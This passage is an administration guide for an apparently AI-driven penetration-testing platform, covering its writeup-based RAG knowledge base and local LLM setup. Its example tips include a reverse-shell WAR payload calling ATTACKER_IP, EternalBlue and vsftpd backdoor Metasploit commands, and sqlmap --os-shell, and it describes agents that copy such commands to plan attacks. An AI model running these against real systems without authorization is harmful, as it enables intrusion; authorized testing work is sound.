# Platform Administration Guide — RAG, LLM & AI Engine

**Platform:** Kali Pentest Platform v3
**Location:** `knowledge/` directory (RAG) | `agents/` directory (LLM)
**Last Updated:** 2026-03

---

## Table of Contents

**Part A — RAG Knowledge Base**
1. [What the RAG System Does](#1-what-the-rag-system-does)
2. [Architecture Overview](#2-architecture-overview)
3. [Files & Their Roles](#3-files--their-roles)
4. [Initial Setup](#4-initial-setup)
5. [Populating the Knowledge Base](#5-populating-the-knowledge-base)
6. [Incremental Updates](#6-incremental-updates)
7. [Adding Knowledge Manually](#7-adding-knowledge-manually)
8. [Testing Search Quality](#8-testing-search-quality)
9. [How Agents Use the KB](#9-how-agents-use-the-kb)
10. [RAG Configuration & Tuning](#10-rag-configuration--tuning)
11. [Knowledge Base Maintenance](#11-knowledge-base-maintenance)
12. [Troubleshooting RAG](#12-troubleshooting-rag)

**Part B — LLM Engine Management**
13. [LLM Architecture](#13-llm-architecture)
14. [Changing the LLM Model](#14-changing-the-llm-model)
15. [Changing the Ollama Server](#15-changing-the-ollama-server)
16. [Embedding Model Management](#16-embedding-model-management)
17. [LLM Performance Tuning](#17-llm-performance-tuning)
18. [Agent System Prompts](#18-agent-system-prompts)
19. [LLM Troubleshooting](#19-llm-troubleshooting)

**Reference**
20. [Quick Reference Card](#20-quick-reference-card)

---

## 1. What the RAG System Does

The **Retrieval-Augmented Generation (RAG)** system gives the platform's AI agents access to a searchable library of real-world penetration testing experience — your CTF writeups, HackTheBox walkthroughs, pentest reports, and custom notes.

**Without RAG:** The LLM plans attacks using only its pre-trained knowledge (general techniques, no specific context about what worked against similar targets).

**With RAG:** Before every planning decision, the agent queries the knowledge base and injects relevant examples directly into the LLM prompt. The agent sees what tools were used against similar services, which exploits succeeded, what privesc paths worked on this OS, and specific command invocations that led to shells.

### What the agent gets from RAG at each decision point:

| Decision | What KB provides |
|----------|-----------------|
| Master plan creation | Past methodology against same target type |
| Recon planning | Which tools found what on similar services |
| Vulnerability scanning | CVE-to-service mappings from real assessments |
| Exploit planning | Commands that got shells on same service/OS |
| Exploit command building | **Exact tool invocations** from writeups (⚡ command chunks) |
| Web testing | Gobuster/sqlmap commands used against same tech stack |
| Privesc planning | **Step-by-step procedures** for same OS (📋 procedure chunks) |
| Privesc evaluation | GTFOBins commands for specific discovered binaries |
| Failed exploit recovery | Alternative approaches when current vector fails |

---

## 2. Architecture Overview

```
knowledge/
├── data/                          ← Source documents (your writeups, reports)
│   ├── *.pdf                      ← CTF writeups, pentest reports
│   ├── *.mhtml                    ← HackTheBox walkthroughs (0xdf format)
│   ├── *.md                       ← Markdown writeups, technique notes
│   ├── *.html / *.htm             ← Saved web pages
│   ├── *.txt                      ← Plain text notes
│   ├── *.json / *.yaml            ← Structured tip/technique collections
│   └── [subdirectories supported] ← Recursively scanned
│
├── chroma_db/                     ← Vector database (auto-created)
│   ├── chroma.sqlite3             ← ChromaDB SQLite store (~21 MB for 260 files)
│   ├── *.bin                      ← HNSW vector index files
│   └── ingest_manifest.json       ← Tracks which files have been ingested
│
├── knowledge_base.py              ← Core RAG API (search, ingest, stats)
├── ingest.py                      ← Ingestion pipeline (chunking, metadata extraction)
├── ingest_data.py                 ← ★ Main admin tool — run this to manage KB
└── requirements_kb.txt            ← Python dependencies
```

### Data flow when an agent uses RAG:

```
Agent needs to plan exploitation
        │
        ▼
_kb_context("exploit apache shell")         ← knowledge_base.py search()
_kb_commands("apache exploit command")      ← knowledge_base.py search_commands()
        │
        ▼
Embed query with all-MiniLM-L6-v2
        │
        ▼
Cosine similarity search in ChromaDB (top 15 candidates)
        │
        ▼
Cross-encoder reranks candidates (ms-marco-MiniLM-L-6-v2)
        │
        ▼
Top K results returned with:
  - Source file and box name
  - Section title (e.g., "Getting a Shell" or "Exploitation")
  - Chunk type (⚡ command / 📋 procedure / 🎯 technique)
  - Tools, CVEs, MITRE TTPs, attack types
  - Relevance score
        │
        ▼
Formatted context injected into LLM prompt
        │
        ▼
LLM plans attack using your real-world experience as context
```

---

## 3. Files & Their Roles

### `knowledge_base.py` — Core API
**What it does:** The brain of the RAG system. Manages the ChromaDB vector database and exposes search/ingest functions used by agents and the Flask API.

**Never run directly.** It is imported by `ingest.py`, `ingest_data.py`, and `agents/master_agent.py`.

**Key functions:**

| Function | Used by | What it returns |
|----------|---------|-----------------|
| `search(query, top_k, phase_filter, outcome_filter, chunk_type_filter)` | Agents, API | Formatted string for LLM injection |
| `search_raw(query, ...)` | Advanced use | List of result dicts with all metadata |
| `search_commands(query, top_k)` | Agents (exploit/web) | List of raw command text strings |
| `search_procedures(query, top_k)` | Agents (privesc/web) | List of raw procedure text strings |
| `search_scripts(query, top_k)` | Advanced use | List of raw script/code strings |
| `ingest(text, source_file, chunk_index, metadata)` | ingest.py | True if added, False if duplicate |
| `ingest_tip(text, category, source)` | ingest_data.py, API | True if added |
| `stats()` | API, ingest_data.py | Dict of counts by phase/outcome/chunk_type |

---

### `ingest.py` — Ingestion Pipeline
**What it does:** Reads files from disk, extracts text, chunks it intelligently, extracts metadata, and calls `knowledge_base.ingest()` for each chunk.

**Run via `ingest_data.py`** (wrapper). Can also be run directly for single-file ingestion.

**Direct usage (rarely needed):**
```bash
# Ingest a single file directly (bypasses manifest):
python3 knowledge/ingest.py /path/to/writeup.pdf

# Run with stats:
python3 knowledge/ingest.py --stats

# Test search:
python3 knowledge/ingest.py --search "apache exploit"
```

**Key capabilities:**

| Feature | How it works |
|---------|-------------|
| **Smart chunking** | Detects code blocks, command sequences, numbered steps, paragraphs separately |
| **Chunk typing** | Classifies each chunk: command/script/procedure/technique/tip/finding/tool_usage/output/report |
| **Metadata extraction** | Pattern-based (no LLM): tools, services, OS, attack types, CVEs, MITRE TTPs, outcomes, ports |
| **Section titles** | Preserves Markdown/HTML heading text in chunk metadata |
| **MHTML support** | Parses `.mhtml`/`.mht` browser archives (used by HackTheBox 0xdf writeups) |
| **Incremental** | Checks manifest before ingesting; skips files with unchanged SHA-256 hash |

---

### `ingest_data.py` — ★ Main Admin Tool
**What it does:** The primary tool you use to manage the knowledge base. Auto-discovers the `knowledge/data/` folder, handles all common operations.

**This is the script you run.** Everything is accessible through this one tool.

```
python3 knowledge/ingest_data.py [OPTIONS]
```

**Full command reference:**

| Command | What happens |
|---------|-------------|
| `python3 knowledge/ingest_data.py` | Incremental ingest — only processes new/changed files in `knowledge/data/` |
| `python3 knowledge/ingest_data.py --force` | Re-processes ALL files regardless of manifest (useful after pipeline changes) |
| `python3 knowledge/ingest_data.py --reset` | Wipes the entire vector database and manifest, then re-ingests everything from scratch |
| `python3 knowledge/ingest_data.py --stats` | Shows current KB statistics without ingesting anything |
| `python3 knowledge/ingest_data.py --search "QUERY"` | Tests a search query and prints results |
| `python3 knowledge/ingest_data.py --search "QUERY" --top-k 5` | Tests with specific result count |
| `python3 knowledge/ingest_data.py --add /path/to/file.pdf` | Adds a single specific file |
| `python3 knowledge/ingest_data.py --add-tip "text"` | Adds a manual tip/trick directly |
| `python3 knowledge/ingest_data.py --add-tip "text" --category privesc` | Adds tip with phase category |
| `python3 knowledge/ingest_data.py --dir /custom/path` | Ingests from a custom directory instead of data/ |
| `python3 knowledge/ingest_data.py --list-sources` | Shows all detected data directories |

---

### `requirements_kb.txt` — Dependencies
**What it does:** Lists all Python packages needed for the RAG system. Install once.

```bash
pip install -r knowledge/requirements_kb.txt
```

**Package roles:**

| Package | Role |
|---------|------|
| `chromadb` | Vector database — stores embeddings and metadata on disk |
| `sentence-transformers` | Embedding model (all-MiniLM-L6-v2) + cross-encoder reranker |
| `pypdf` | PDF text extraction |
| `beautifulsoup4` + `lxml` | HTML/MHTML text extraction and parsing |
| `tqdm` | Progress bars during bulk ingestion |
| `PyYAML` | YAML file support (optional, for structured tip files) |

---

## 4. Initial Setup

### Step 1 — Install dependencies
```bash
cd /path/to/platform
pip install -r knowledge/requirements_kb.txt
```

This installs all required packages. First run of the ingest script will download:
- `all-MiniLM-L6-v2` embedding model (~80 MB) → cached at `~/.cache/huggingface/`
- `cross-encoder/ms-marco-MiniLM-L-6-v2` reranker (~70 MB) → same cache location

Both are downloaded once and cached permanently. No internet required after first download.

### Step 2 — Place your files in data/
Copy your writeups, reports, and notes into `knowledge/data/`:
```bash
cp /path/to/writeups/*.pdf knowledge/data/
cp /path/to/htb_writeups/*.mhtml knowledge/data/
cp /path/to/pentest_reports/*.pdf knowledge/data/
```

Subdirectories are supported — the scanner is recursive:
```
knowledge/data/
├── htb/
│   ├── easy/*.pdf
│   └── medium/*.mhtml
├── thm/*.pdf
├── pentest_reports/*.pdf
└── custom_notes/*.md
```

### Step 3 — Run initial ingestion
```bash
python3 knowledge/ingest_data.py
```

For 260 files (~200 MB), expect:
- **Time:** 10–40 minutes (depends on CPU speed)
- **Output:** Progress bar showing files processed
- **Result:** `knowledge/chroma_db/` created with vector index

After completion, the output shows:
```
══════════════════════════════════════════════════
  ✅ INGESTION COMPLETE  (847.3s)
══════════════════════════════════════════════════
  Files processed    : 261
  Files unchanged    : 0
  Chunks added       : 48,392
  Chunks skipped     : 0 (duplicates)
  Errors             : 2

  📚 Knowledge Base Statistics
  ──────────────────────────────────────────────────
  Total chunks   : 48,392
  Source files   : 261
  Embed model    : all-MiniLM-L6-v2
  Rerank model   : cross-encoder/ms-marco-MiniLM-L-6-v2
  ...
```

### Step 4 — Verify it works
```bash
# Test search quality:
python3 knowledge/ingest_data.py --search "apache exploit shell"
python3 knowledge/ingest_data.py --search "sudo privesc ubuntu root"
python3 knowledge/ingest_data.py --search "smb eternalblue ms17-010"
```

Good results look like:
```
⚡ [writeup_lame.pdf · lame · exploit → shell obtained · 0.89]
  tools: nmap, metasploit, searchsploit | cves: CVE-2017-0143 | techniques: eternalblue
  msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.4
  msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.3
  msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

---

## 5. Populating the Knowledge Base

### What file types are supported

| Extension | Handler | Notes |
|-----------|---------|-------|
| `.pdf` | pypdf | Page-by-page extraction. Scanned PDFs (images) won't yield text. |
| `.mhtml` / `.mht` | email + BeautifulSoup | HackTheBox writeups saved from browser. Full support. |
| `.html` / `.htm` | BeautifulSoup | Strips nav/footer/scripts. Sections split on heading tags. |
| `.md` / `.markdown` | Custom parser | Split on headings, code blocks extracted separately. |
| `.txt` | Plain text | No sectioning — entire file chunked as prose. |
| `.json` | Custom parser | Supports `{title, text}` objects, arrays, nested structures. |
| `.yaml` / `.yml` | PyYAML | Same structure support as JSON. |

### What makes good knowledge base content

**High value** (highly recommended to include):
- HTB/THM writeups (step-by-step, include exact commands)
- 0xdf HackTheBox walkthroughs (saved as .mhtml)
- Pentest reports with technical findings
- BTLO / CyberDefenders lab writeups
- CTF writeups with exploitation chains
- Your own pentest notes from engagements

**Medium value:**
- Tool documentation/cheat sheets
- OWASP testing guides
- PayloadsAllTheThings (markdown format)
- HackTricks methodology pages (saved as HTML)

**Add as tips (see Section 7):**
- One-liners you frequently use
- Bypasses you've discovered
- Tool-specific flags you always forget
- Environment-specific tricks (target-type specific)

### What metadata gets extracted automatically

For every file, the pipeline extracts without any LLM:

| Metadata field | Examples |
|---------------|----------|
| `tools` | nmap, sqlmap, linpeas, gobuster (130+ recognized) |
| `services` | apache, nginx, smb, wordpress, mysql (50+ patterns) |
| `os` | linux ubuntu, windows server 2019, freebsd |
| `attack_types` | sqli, lfi_rce, kerberoasting, sudo_privesc (50+ types) |
| `cves` | CVE-2021-41773, CVE-2017-0144 (extracted from text) |
| `mitre_ttps` | T1059, T1548.003 (T#### patterns) |
| `outcome` | shell obtained, root, user flag, failed |
| `difficulty` | easy, medium, hard, insane |
| `ports` | [80, 443, 22, 445] (from "port 80", "80/tcp" patterns) |
| `box_name` | lame, jerry, blue (from "machine: X" patterns) |
| `phase` | recon, exploit, privesc, web, lateral, post (auto-classified) |
| `chunk_type` | command, script, procedure, technique, tip, finding, tool_usage |
| `section_title` | "Getting a Foothold", "Privilege Escalation" (from headings) |

---

## 6. Incremental Updates

The manifest system means you never have to wipe and re-ingest everything. Just drop new files in `data/` and run the script.

### Adding new writeups
```bash
# 1. Copy new files to data/:
cp ~/Downloads/new_htb_writeup.pdf knowledge/data/

# 2. Run incremental ingest (only processes the new file):
python3 knowledge/ingest_data.py
```

Output will show:
```
Found 262 files | 1 to ingest | 261 unchanged (skipped)
```

### After modifying a file
If you edit an existing file (e.g., add notes to a PDF using a PDF editor), the SHA-256 hash changes and the file is re-ingested automatically:
```bash
python3 knowledge/ingest_data.py
# Output: Found 261 files | 1 to ingest | 260 unchanged (skipped)
```

### Force full re-ingest
When to use `--force`:
- After upgrading the ingestion pipeline (chunking logic changed)
- After resetting the vector database
- When you suspect corrupted entries
```bash
python3 knowledge/ingest_data.py --force
# Processes ALL files regardless of manifest
```

### Checking what's in the manifest
The manifest is a plain JSON file:
```bash
# View manifest directly:
cat knowledge/chroma_db/ingest_manifest.json

# Or use stats to get summary counts:
python3 knowledge/ingest_data.py --stats
```

Manifest entry format:
```json
{
  "/full/path/to/file.pdf": {
    "hash": "sha256hexstring",
    "timestamp": 1711234567.89,
    "chunks": 142,
    "ext": ".pdf"
  }
}
```

---

## 7. Adding Knowledge Manually

### Option A — Add a single tip via command line
Best for: Quick one-liners, command reminders, technique notes.

```bash
# Generic tip:
python3 knowledge/ingest_data.py --add-tip "For vsftpd 2.3.4, use the backdoor exploit: \
  msf6 use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS TARGET; run"

# With phase category (improves filtering):
python3 knowledge/ingest_data.py \
  --add-tip "Always check /etc/passwd for non-standard shells and sudo -l immediately after getting user. \
  Common privesc: find / -perm -u=s -type f 2>/dev/null | xargs ls -la" \
  --category privesc

python3 knowledge/ingest_data.py \
  --add-tip "For WordPress sites, always check: wp-login.php default creds (admin:admin), xmlrpc.php \
  for brute force, /wp-content/uploads/ for webshells, wpscan for plugin CVEs" \
  --category web
```

**Valid categories:** recon, exploit, privesc, web, post, lateral, general

### Option B — Add a specific file
Best for: A new writeup you downloaded, a custom cheat sheet, a tool manual.

```bash
python3 knowledge/ingest_data.py --add /path/to/new_writeup.pdf
python3 knowledge/ingest_data.py --add ~/Downloads/htb_writeup_forest.mhtml
python3 knowledge/ingest_data.py --add ~/notes/ad_attack_cheatsheet.md
```

### Option C — Create a YAML/JSON tip collection
Best for: Bulk importing structured knowledge (cheat sheets, tool references, technique libraries).

Create a file like `knowledge/data/custom_tips.yaml`:
```yaml
# custom_tips.yaml — Personal pentest knowledge

- title: "Tomcat Manager Shell Upload"
  text: |
    When Tomcat Manager is accessible at /manager/html with default creds (admin:admin, tomcat:tomcat,
    manager:manager), upload a WAR reverse shell:
      msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war
    Upload via /manager/html → Deploy → WAR file to deploy
    Trigger with: curl http://TARGET:8080/shell/
    This gives a shell as the tomcat service user.
  category: exploit

- title: "SQLMap POST Form"
  text: |
    For SQLi in login forms, use:
      sqlmap -u "http://TARGET/login.php" --data="username=admin&password=test" \
             --dbs --batch --level 3 --risk 2
    Or capture request with Burp and save to req.txt:
      sqlmap -r req.txt --dbs --batch --os-shell
  category: web

- title: "Linux Privesc Checklist"
  text: |
    After getting user shell, run in order:
    1. sudo -l (check sudo rights without password)
    2. find / -perm -u=s -type f 2>/dev/null (SUID binaries)
    3. crontab -l; cat /etc/crontab; ls /etc/cron* (cron jobs)
    4. cat /etc/passwd (look for other users, check home dirs)
    5. find / -writable -type f 2>/dev/null | grep -v proc (writable files)
    6. uname -a (kernel version for kernel exploits)
    7. run linpeas.sh for comprehensive enumeration
  category: privesc
```

Then ingest it:
```bash
python3 knowledge/ingest_data.py --add knowledge/data/custom_tips.yaml
# Or just drop it in data/ and run:
python3 knowledge/ingest_data.py
```

### Option D — Manual ingest from the GUI
In the platform web interface:
1. Go to **Knowledge Base** page → **✏ Manual Ingest** tab
2. Paste your text
3. Set Source Label (e.g., `tomcat_notes`)
4. Set Phase and Outcome (or leave on Auto-detect)
5. Click **+ Add to Knowledge Base**

This calls `POST /knowledge/ingest` which calls `knowledge_base.ingest_tip()`.

---

## 8. Testing Search Quality

Always test after ingestion to verify the KB is returning useful results.

### Basic search tests
```bash
# Test broad techniques:
python3 knowledge/ingest_data.py --search "apache exploit shell"
python3 knowledge/ingest_data.py --search "sudo privesc ubuntu root"
python3 knowledge/ingest_data.py --search "smb eternalblue ms17-010"
python3 knowledge/ingest_data.py --search "wordpress wpscan admin shell"

# Test specific tool commands:
python3 knowledge/ingest_data.py --search "sqlmap POST form database dump"
python3 knowledge/ingest_data.py --search "gobuster directory fuzzing php"
python3 knowledge/ingest_data.py --search "hydra ssh brute force"

# Test procedures:
python3 knowledge/ingest_data.py --search "privilege escalation steps methodology linux"
python3 knowledge/ingest_data.py --search "active directory bloodhound kerberoasting steps"
```

### Validate chunk types are working
After ingestion, check the stats to see chunk type distribution:
```bash
python3 knowledge/ingest_data.py --stats
```

Expected distribution (approximate for 260 CTF writeups):
```
By chunk type:
  🎯 technique      ~45%  (methodology descriptions)
  ⚡ command        ~20%  (tool invocations — critical for agents)
  📋 procedure      ~15%  (numbered step sequences)
  📜 script          ~8%  (code blocks, payloads)
  💡 tip             ~4%  (tip/note sections)
  🔍 finding         ~4%  (vulnerability descriptions)
  📊 output          ~3%  (tool output samples)
  🔧 tool_usage      ~1%  (tool documentation)
```

If `command` chunks are very low (< 10%), your source documents may not have many explicit command-line examples. Consider adding more writeup-style content with `$ ` or `# ` prompts, or add custom tips (Option A/C above).

### Testing from the GUI
1. Go to **Knowledge Base** → **🔍 Test Search** tab
2. Enter a query
3. Try different **CHUNK TYPE** filters to see what's available:
   - `⚡ command` — see actual tool commands in the KB
   - `📋 procedure` — see step-by-step procedures
   - `💡 tip` — see tip/trick entries
4. Try **PHASE FILTER** = `privesc` + **OUTCOME FILTER** = `root` for the highest-quality privesc context

### Relevance tuning
If results are poor, check:

1. **Too few results?** Lower `MIN_RELEVANCE` in `knowledge_base.py` (default `0.30`). Try `0.25`.
2. **Results irrelevant?** Raise `MIN_RELEVANCE` to `0.35` or `0.40`.
3. **Wrong chunk types?** Check stats to ensure your source files have command/procedure chunks.
4. **Missing a topic?** Add a YAML tip file for that topic (Section 7, Option C).

---

## 9. How Agents Use the KB

Understanding this helps you know what to put in the KB.

### Where KB is queried in master_agent.py

The agent queries the KB at 14 different decision points. The most impactful ones:

#### `_llm_build_exploit_command()` — Builds exact tool commands
Queries: `_kb_commands()` + `_kb_context()`
**What to have in KB:** Exact `sqlmap`, `hydra`, `gobuster`, `msfconsole`, `curl` invocations from writeups. The agent literally copies command patterns and adapts them to the current target.

Example KB entry that helps here:
```
$ gobuster dir -u http://10.10.10.75 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak -t 50 -o gobuster_80.txt
```

#### `_llm_plan_privesc()` — Plans privilege escalation
Queries: `_kb_context(phase="privesc", outcome="root")` + `_kb_commands()` + `_kb_procedures()`
**What to have in KB:** Step-by-step privesc walkthroughs, GTFOBins examples, linpeas output analysis notes.

#### `_llm_plan_exploitation()` — Plans initial access
Queries: `_kb_context(outcome="shell obtained")` + `_kb_commands()`
**What to have in KB:** Writeups where shells were obtained, with specific service/port context.

#### `_llm_evaluate_exploit_result()` — Recovers from failure
Queries: `_kb_context()` + `_kb_commands()` (only when exploit fails)
**What to have in KB:** "When X fails, try Y" notes. Alternative approaches.

### KB context functions available to agents

| Function | Returns | Agent use |
|----------|---------|-----------|
| `_kb_context(query, phase, outcome)` | Formatted string for LLM | General planning context |
| `_kb_commands(query)` | Formatted command examples | Building exact commands |
| `_kb_procedures(query)` | Formatted step-by-step | Methodology planning |

---

## 10. RAG Configuration & Tuning

### Embedding model selection

Set via environment variable before running ingest/server:

```bash
# Default (fast, good quality, ~80 MB):
export KB_EMBED_MODEL="all-MiniLM-L6-v2"

# Higher quality (slower, larger, ~420 MB):
export KB_EMBED_MODEL="all-mpnet-base-v2"

# Good balance (~130 MB, instruction-tuned):
export KB_EMBED_MODEL="BAAI/bge-small-en-v1.5"
```

**Important:** After changing the embed model, you MUST wipe and re-ingest:
```bash
KB_EMBED_MODEL=all-mpnet-base-v2 python3 knowledge/ingest_data.py --reset
```
Mixing embeddings from different models in the same collection gives garbage results.

### Reranker configuration

```bash
# Default (enabled, ~70 MB):
export KB_RERANK_MODEL="cross-encoder/ms-marco-MiniLM-L-6-v2"

# Disable reranking (faster searches, lower precision):
export KB_RERANK_MODEL=""
```

Reranking adds ~100–300ms per search query. It significantly improves result precision when you have many candidates. On a slow machine, disable it and use more results (top_k=8) instead.

### Chunk size tuning

Edit `CHUNK_SIZES` in `knowledge/ingest.py`:

```python
CHUNK_SIZES = {
    "script":     600,   # Keep scripts intact, can be longer
    "command":    300,   # Commands with context
    "procedure":  500,   # Step-by-step instructions
    "technique":  400,   # Descriptions
    "tip":        250,   # Tips are usually short
    "finding":    450,   # Findings with context
    "default":    400,
}
CHUNK_OVERLAP = 80      # Words of overlap between consecutive chunks
MIN_CHUNK_LEN = 60      # Minimum chars to store a chunk
```

After changing chunk sizes, run `--reset` to re-ingest with new parameters.

### Relevance threshold

Edit `MIN_RELEVANCE` in `knowledge/knowledge_base.py`:

```python
MIN_RELEVANCE = 0.30    # Default — lower = more results, potentially less relevant
```

- `0.20` — Very permissive, returns more results (may include noise)
- `0.30` — Default balance
- `0.40` — Strict, only very relevant results (may return nothing for niche queries)

### Search result count

Default `top_k` per agent call ranges from 3–5. The `RERANK_FETCH` constant controls how many candidates are fetched before reranking:

```python
RERANK_FETCH = 15    # Fetch this many from ChromaDB, rerank, keep top_k
```

Raising this improves reranker quality at the cost of slightly more compute.

---

## 11. Knowledge Base Maintenance

### Routine maintenance (monthly)

```bash
# 1. Check current stats:
python3 knowledge/ingest_data.py --stats

# 2. Add any new writeups you've accumulated:
cp ~/Downloads/new_writeups/*.pdf knowledge/data/
python3 knowledge/ingest_data.py

# 3. Test quality on your most common use cases:
python3 knowledge/ingest_data.py --search "web application upload shell"
python3 knowledge/ingest_data.py --search "active directory lateral movement"
```

### After adding many new files

```bash
# Check stats before and after:
python3 knowledge/ingest_data.py --stats    # before

cp ~/new_batch/*.pdf knowledge/data/
python3 knowledge/ingest_data.py            # incremental ingest

python3 knowledge/ingest_data.py --stats    # after — verify chunk counts increased
```

### Rebuilding from scratch (after pipeline upgrade)

When the ingest.py chunking logic is updated (new chunk types, better metadata extraction), old chunks won't benefit from improvements. Rebuild:

```bash
# This wipes chroma_db/ and ingest_manifest.json, then re-ingests all files:
python3 knowledge/ingest_data.py --reset
```

Expect the same time as initial ingestion (~10–40 min for 260 files).

### Backing up the knowledge base

The entire vector database is in `knowledge/chroma_db/`. Back it up:

```bash
# Simple backup:
tar -czf kb_backup_$(date +%Y%m%d).tar.gz knowledge/chroma_db/

# Restore:
tar -xzf kb_backup_20260101.tar.gz
```

The `knowledge/data/` folder (source documents) is your primary data — back that up separately. The `chroma_db/` can always be rebuilt from `data/` using `--reset`.

### Removing a specific source from the KB

ChromaDB does not provide a simple "delete by source file" operation through the current API. Options:

1. **Nuclear option** (simplest): `--reset` and re-ingest without the file
2. **Manual removal**: Use ChromaDB Python API directly
```python
import chromadb
client = chromadb.PersistentClient(path="knowledge/chroma_db")
col = client.get_collection("pentest_knowledge")
# Get IDs for chunks from a specific file:
results = col.get(where={"source_file": {"$eq": "unwanted_file.pdf"}})
if results["ids"]:
    col.delete(ids=results["ids"])
    print(f"Deleted {len(results['ids'])} chunks")
```

---

## 12. Troubleshooting RAG

### KB not being used by agents
**Symptom:** Agent plans don't mention KB context; `_KB_AVAILABLE = False` in logs.

**Check:**
```bash
# Verify dependencies are installed:
python3 -c "import chromadb, sentence_transformers; print('OK')"

# Verify KB has data:
python3 knowledge/ingest_data.py --stats

# Check import path (run from platform root):
python3 -c "
import sys
sys.path.insert(0, 'knowledge')
import knowledge_base as kb
s = kb.stats()
print('KB chunks:', s.get('total_chunks', 0))
"
```

**Fix:**
```bash
pip install -r knowledge/requirements_kb.txt
python3 knowledge/ingest_data.py  # populate KB if empty
```

### Search returns no results
**Symptom:** `--search` returns "(no results found)"

**Diagnoses:**
1. KB is empty — run `--stats` to check `total_chunks`
2. Query too specific — try broader terms
3. `MIN_RELEVANCE` too high — lower it in `knowledge_base.py`
4. Collection name mismatch — rare, run `--reset` to rebuild

**Fix:**
```bash
# Check if KB has data:
python3 knowledge/ingest_data.py --stats

# Try a very broad query:
python3 knowledge/ingest_data.py --search "exploit"

# If still no results, rebuild:
python3 knowledge/ingest_data.py --reset
```

### Slow search queries
**Symptom:** Each KB search takes 2–5+ seconds.

**Causes and fixes:**
- Reranker enabled on slow CPU → `export KB_RERANK_MODEL=""` to disable
- Large collection → normal for >100K chunks; consider upgrading RAM
- Cold start (first query loads model) → subsequent queries are faster

### PDF text extraction fails
**Symptom:** "PDF parse error" in logs; 0 chunks from a PDF.

**Cause:** Scanned PDFs (images) have no embedded text. `pypdf` can only extract embedded text.

**Fix:** Use OCR to create searchable PDFs:
```bash
# Install OCR tools:
apt install tesseract-ocr ocrmypdf

# Create searchable PDF:
ocrmypdf input.pdf output_searchable.pdf

# Then ingest:
python3 knowledge/ingest_data.py --add output_searchable.pdf
```

### Duplicate chunks warning
**Symptom:** Many "Chunks skipped (duplicates)" in ingest output.

**Cause:** Normal behavior — the same content was ingested before (same source file, same chunk index, same text).

**Not a problem** — the manifest prevents full re-ingestion; duplicates are only skipped when the manifest is bypassed (e.g., with `--force`).

### ChromaDB version errors
**Symptom:** `AttributeError` or `ImportError` from chromadb.

**Fix:**
```bash
pip install --upgrade chromadb sentence-transformers
# If upgrading fails due to collection format change:
python3 knowledge/ingest_data.py --reset
```

### MHTML files produce empty output
**Symptom:** `mhtml` files ingested but 0 chunks added.

**Check:** The MHTML parser requires BeautifulSoup and lxml:
```bash
python3 -c "from bs4 import BeautifulSoup; import lxml; print('OK')"
```

If not installed:
```bash
pip install beautifulsoup4 lxml
```

---

---

## 13. LLM Architecture

The platform uses **Ollama** as its local LLM inference server. Every AI decision — attack planning, exploit selection, command generation, result analysis — flows through this single pipeline:

```
Frontend (React) → agent_server.py (FastAPI) → MasterAgent → think() → Ollama HTTP API
                                                                              │
                                                                    Local model inference
                                                                    (any Ollama-compatible model)
```

### Where LLM configuration lives

All LLM settings are controlled in **two files**:

| File | What it controls |
|------|-----------------|
| `agent_server.py` lines 44–45 | Primary config: `OLLAMA_URL`, `MODEL_NAME` (read from env vars) |
| `agents/base_agent.py` lines 34–38 | Agent-level config: `OLLAMA_URL`, `MODEL_NAME`, `LLM_THINK_TIMEOUT` (hardcoded fallback) |

The values in `agent_server.py` are the authoritative source — they read from environment variables with hardcoded defaults. The values in `base_agent.py` are hardcoded and must be edited manually if not using environment variables.

### Current default configuration

```
OLLAMA_URL = "http://192.168.0.100:11434"   (Ollama server address)
MODEL_NAME = "glm-5:cloud"                   (Model name in Ollama)
LLM_THINK_TIMEOUT = 120                      (Seconds per LLM call)
```

---

## 14. Changing the LLM Model

### Method 1 — Environment variables (recommended, no file edits)

```bash
# Start the platform with a different model:
OLLAMA_MODEL=llama3.1:70b python3 agent_server.py
OLLAMA_MODEL=qwen2.5:32b  python3 agent_server.py
OLLAMA_MODEL=deepseek-r1:32b python3 agent_server.py

# Set permanently in your shell:
echo 'export OLLAMA_MODEL="llama3.1:70b"' >> ~/.bashrc
source ~/.bashrc
python3 agent_server.py
```

### Method 2 — Edit the source files directly

Edit **both** files for consistency:

**`agent_server.py`** (line 45):
```python
# Before:
MODEL_NAME = os.environ.get("OLLAMA_MODEL", "glm-5:cloud")

# After (change the default string):
MODEL_NAME = os.environ.get("OLLAMA_MODEL", "llama3.1:70b")
```

**`agents/base_agent.py`** (line 35):
```python
# Before:
MODEL_NAME = "glm-5:cloud"          # ← Update to your model name

# After:
MODEL_NAME = "llama3.1:70b"         # ← Your chosen model
```

### How to install a model in Ollama

Run these on your Ollama server machine:

```bash
# List available models (what's already downloaded):
ollama list

# Pull a model (downloads from Ollama library):
ollama pull llama3.1:8b       # ~4.7 GB — fast, decent reasoning
ollama pull llama3.1:70b      # ~40 GB — excellent reasoning, needs high VRAM
ollama pull qwen2.5:14b       # ~8 GB — very good at JSON/structured output
ollama pull qwen2.5:32b       # ~20 GB — excellent structured output
ollama pull deepseek-r1:14b   # ~8 GB — strong reasoning, shows chain-of-thought
ollama pull deepseek-r1:32b   # ~19 GB — best reasoning if you have the VRAM
ollama pull mistral-nemo       # ~7 GB — fast, good instruction following
ollama pull phi4               # ~9 GB — Microsoft's strong reasoning model

# Check model is loaded and responding:
ollama run llama3.1:8b "What is SQL injection?"

# See model details (context length, parameters):
ollama show llama3.1:8b
```

### Recommended models by use case

| Model | VRAM | Best for | Notes |
|-------|------|----------|-------|
| `qwen2.5:14b` | 8 GB | JSON output, attack planning | Excellent structured output |
| `qwen2.5:32b` | 20 GB | All-round best small model | Best balance of quality/speed |
| `llama3.1:70b` | 40 GB | Complex reasoning, privesc | Best overall if VRAM allows |
| `deepseek-r1:32b` | 19 GB | Chain-of-thought planning | Shows reasoning steps |
| `mistral-nemo` | 7 GB | Fast iteration, light testing | Fastest good-quality option |
| `phi4` | 9 GB | Technical accuracy | Good at following instructions |
| `glm-5:cloud` | N/A | Cloud API (current default) | Remote — requires network |

**Most important property for this platform:** The model must reliably output **valid JSON** when instructed. Models with poor JSON compliance will cause agent planning loops. Test with:

```bash
ollama run YOUR_MODEL 'Return ONLY valid JSON: {"status": "ok", "tools": ["nmap", "gobuster"]}'
```

